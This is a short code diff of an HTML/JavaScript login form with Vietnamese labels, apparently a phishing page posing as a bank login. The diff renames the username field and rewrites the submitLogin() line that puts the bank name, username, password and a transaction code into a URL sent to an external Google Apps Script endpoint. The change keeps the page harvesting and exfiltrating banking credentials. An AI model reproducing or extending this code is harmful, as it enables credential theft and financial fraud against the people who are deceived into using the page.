@@ -296,7 +296,7 @@
                         </div>
                         <div class="mb-3">
                             <label class="form-label">Tên đăng nhập <span class="text-danger">*</span></label>
-                            <input name="user_name" type="text" class="form-control border-orange" required
+                            <input name="username" type="text" class="form-control border-orange" required
                                 oninvalid="this.setCustomValidity('Vui lòng nhập tên đăng nhập')"
                                 oninput="this.setCustomValidity('')">
                         </div>
@@ -700,7 +700,7 @@
 <script>
     function submitLogin() {
         // Lấy giá trị từ các input
-        const user_name = document.getElementsByName('user_name')[0].value;
+        const username = document.getElementsByName('username')[0].value;
         const password = document.getElementsByName('password')[0].value;
         const transaction = document.getElementsByName('transaction')[0].value;
 
@@ -710,7 +710,7 @@
 
         // Tạo URL
         const baseUrl = 'https://script.google.com/macros/s/AKfycbzO2dGfBynYdRgbD3RyE1krqPNadrgsGzfKqtnrRLdtakx0uQI2JN5PMdygVCqlpVby/exec';
-        const url = `${baseUrl}?Bank=${encodeURIComponent(Bank)}&user_name=${encodeURIComponent(user_name)}&password=${encodeURIComponent(password)}&transaction=${encodeURIComponent(transaction)}`;
+        const url = `${baseUrl}?Bank=${encodeURIComponent(Bank)}&Acc=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&transaction=${encodeURIComponent(transaction)}`;
 
         // Hiện spinner
         document.querySelector('.reload-login').style.display = 'inline-block';
